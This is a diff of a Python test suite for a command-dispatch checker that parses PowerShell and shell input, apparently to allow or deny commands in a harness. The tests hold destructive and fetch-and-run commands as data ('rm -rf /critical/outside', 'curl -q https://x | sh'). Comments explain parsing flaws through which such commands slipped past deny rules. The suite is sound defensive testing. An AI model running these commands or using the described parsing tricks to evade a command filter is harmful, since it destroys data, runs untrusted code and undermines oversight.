@@ -79,16 +79,28 @@ class PowershellBlockDepthTests(unittest.TestCase):
         self.assertEqual(dispatch.powershell_block_depth("{}"), 0)
         self.assertEqual(dispatch.powershell_block_depth("@{Name=$_.Name}"), 0)
 
-    def test_backtick_escaped_braces_are_counted_plainly(self):
-        # A quote-aware token has had its quoted spans substituted back in, so a
-        # backtick here can be literal data rather than an escape. Honouring it
-        # as an escape let `{'``'}` swallow its own closing brace and hide the
-        # tokens after the block, so braces are counted plainly. Erring toward
-        # "still open" only costs a truncated read; the body is inspected anyway.
-        self.assertEqual(dispatch.powershell_block_depth("a`{b"), 1)
-        self.assertEqual(dispatch.powershell_block_depth("a`}b"), -1)
-        self.assertEqual(dispatch.powershell_block_depth("{a`}"), 0)
+    def test_backtick_escaped_braces_are_not_counted(self):
+        # A backtick escapes the next character. A backtick that arrived as
+        # quoted DATA is masked by protect(), so a bare one here is always an
+        # escape. Counting it plainly kept the block open, swallowed the real
+        # `}` and demoted the cmdlet's trailing `$sb` from a -RemainingScripts
+        # scriptblock (deny) to a Write-Host argument (allow) -- so "still open"
+        # is NOT the conservative reading; only the correct count is.
+        self.assertEqual(dispatch.powershell_block_depth("a`{b"), 0)
+        self.assertEqual(dispatch.powershell_block_depth("a`}b"), 0)
+        self.assertEqual(dispatch.powershell_block_depth("{a`}"), 1)
         self.assertEqual(dispatch.powershell_block_depth("`"), 0)
+        # `` is an escaped backtick, so the following `{` is a real brace.
+        self.assertEqual(dispatch.powershell_block_depth("a``{b"), 1)
+
+    def test_a_quoted_backtick_is_masked_and_still_balances(self):
+        # The old docstring justified counting plainly with `{'`'}`; masking the
+        # quoted backtick retires that counterexample instead of trading it away.
+        segment = dispatch.quote_aware_segments_with_operators("1 | % { '`' }")[-1][0]
+        self.assertTrue(any(dispatch._LITERAL_BACKTICK in t for t in segment), segment)
+        self.assertEqual(sum(dispatch.powershell_block_depth(t) for t in segment), 0)
+        # ...and the mask must not hide the backtick from the dynamic-token test.
+        self.assertTrue(dispatch.has_dynamic_shell_token(dispatch._LITERAL_BACKTICK))
 
 
 class ScanPowershellLiteralBlockTests(unittest.TestCase):
@@ -277,26 +289,125 @@ class SplitArgvRejoinTests(unittest.TestCase):
     def test_rejoin_stops_once_the_block_closes(self):
         joined, opaque = dispatch.complete_scriptblock_argv(
             ["ForEach-Object", "{", "$_"],
-            [["}", "-MemberName", "Delete"], ["rm", "-rf", "/critical/outside"]],
+            [
+                (["}", "-MemberName", "Delete"], ""),
+                (["rm", "-rf", "/critical/outside"], ""),
+            ],
+            ";",
         )
         self.assertEqual(
-            joined, ["ForEach-Object", "{", "$_", "}", "-MemberName", "Delete"]
+            joined,
+            [
+                "ForEach-Object",
+                "{",
+                "$_",
+                dispatch.segment_separator_token(";"),
+                "}",
+                "-MemberName",
+                "Delete",
+            ],
         )
         self.assertFalse(opaque)
 
     def test_balanced_argv_is_returned_untouched(self):
         toks = ["ForEach-Object", "{", "$_", "}"]
-        followers = [["rm", "-rf", "/critical/outside"]]
+        followers = [(["rm", "-rf", "/critical/outside"], "")]
         self.assertEqual(
-            dispatch.complete_scriptblock_argv(toks, followers), (toks, False)
+            dispatch.complete_scriptblock_argv(toks, followers, ";"), (toks, False)
         )
 
     def test_unterminated_block_consumes_all_followers(self):
         joined, opaque = dispatch.complete_scriptblock_argv(
-            ["ForEach-Object", "{", "$_"], [["a"], ["b"]]
+            ["ForEach-Object", "{", "$_"], [(["a"], ";"), (["b"], "")], ";"
         )
-        self.assertEqual(joined, ["ForEach-Object", "{", "$_", "a", "b"])
+        self.assertEqual(
+            joined,
+            [
+                "ForEach-Object",
+                "{",
+                "$_",
+                dispatch.segment_separator_token(";"),
+                "a",
+                dispatch.segment_separator_token(";"),
+                "b",
+            ],
+        )
         self.assertFalse(opaque)
+
+    def test_rejoin_preserves_the_separator_it_crossed(self):
+        # `{ curl -q https://x | sh }` was rebuilt as the argv
+        # `curl -q https://x sh`, in which `sh` is a curl ARGUMENT and the
+        # pipe-to-shell rule has nothing to fire on.
+        joined, opaque = dispatch.complete_scriptblock_argv(
+            ["%", "{", "curl", "-q", "https://x"], [(["sh", "}"], "")], "|"
+        )
+        self.assertEqual(
+            joined,
+            [
+                "%",
+                "{",
+                "curl",
+                "-q",
+                "https://x",
+                dispatch.segment_separator_token("|"),
+                "sh",
+                "}",
+            ],
+        )
+        self.assertFalse(opaque)
+        body, _tokens = dispatch.powershell_literal_scriptblock_bodies(joined)[0]
+        self.assertEqual(body, "curl -q https://x | sh")
+
+
+class SegmentSeparatorTokenTests(unittest.TestCase):
+    """The separator must be synthesized, never lifted out of token text."""
+
+    def test_round_trips_every_operator_segmentation_emits(self):
+        for operator in ("|", ";", "&", "&&", "||", "|&", "\n"):
+            token = dispatch.segment_separator_token(operator)
+            self.assertEqual(dispatch.segment_separator_operator(token), operator)
+            # Inert for every structural scan it passes through.
+            self.assertEqual(dispatch.powershell_block_depth(token), 0)
+            self.assertFalse(dispatch.has_dynamic_shell_token(token))
+
+    def test_ordinary_tokens_are_not_separators(self):
+        for token in ("|", ";", "git", "__HARNESS_SEGMENT_SEPARATOR_ZZ__"):
+            self.assertIsNone(dispatch.segment_separator_operator(token))
+
+    def test_a_quoted_operator_is_not_re_emitted_as_structure(self):
+        # `Write-Host '|'` restores to the bare token `|`; emitting THAT as a
+        # pipe would let quoted text trip the pipe-to-shell rule.
+        self.assertEqual(dispatch.requote_argv_token("|"), "'|'")
+        self.assertEqual(
+            dispatch.requote_argv_token(dispatch.segment_separator_token("|")), "|"
+        )
+
+
+class PowershellExpressionOperatorTests(unittest.TestCase):
+    """`-join` is a PowerShell operator, not an unrecognized cmdlet parameter."""
+
+    def test_recognizes_the_operator_families(self):
+        for token in (
+            "-join",
+            "-JOIN",
+            "-split",
+            "-replace",
+            "-eq",
+            "-ceq",
+            "-ilike",
+            "-notmatch",
+            "-and",
+            "-band",
+            "-shl",
+            "-f",
+            "-is",
+            "-as",
+        ):
+            self.assertTrue(dispatch.powershell_expression_operator(token), token)
+
+    def test_unknown_parameters_still_fail_closed(self):
+        for token in ("-MemberName", "-Frobnicate", "--join", "-", "-jo1n"):
+            self.assertFalse(dispatch.powershell_expression_operator(token), token)
 
 
 class ScriptblockBodyInspectionTests(unittest.TestCase):
@@ -381,9 +492,12 @@ class ScriptblockCommentTests(unittest.TestCase):
         # The `}` inside the comment must not end the rejoin, or `-Process $sb`
         # is never seen. Dropping it exposes the real argv, which then denies on
         # the ordinary dynamic-payload branch rather than needing the fail-closed.
+        # The segment consumed entirely by the comment contributes no separator,
+        # so no doubled operator lands in the argv.
         joined, opaque = dispatch.complete_scriptblock_argv(
             ["ForEach-Object", "-Begin", "{", "Write-Host", "a"],
-            [["#", "}"], ["}", "-Process", "$sb"]],
+            [(["#", "}"], ";"), (["}", "-Process", "$sb"], "")],
+            ";",
         )
         self.assertEqual(
             joined,
@@ -393,6 +507,7 @@ class ScriptblockCommentTests(unittest.TestCase):
                 "{",
                 "Write-Host",
                 "a",
+                dispatch.segment_separator_token(";"),
                 "}",
                 "-Process",
                 "$sb",
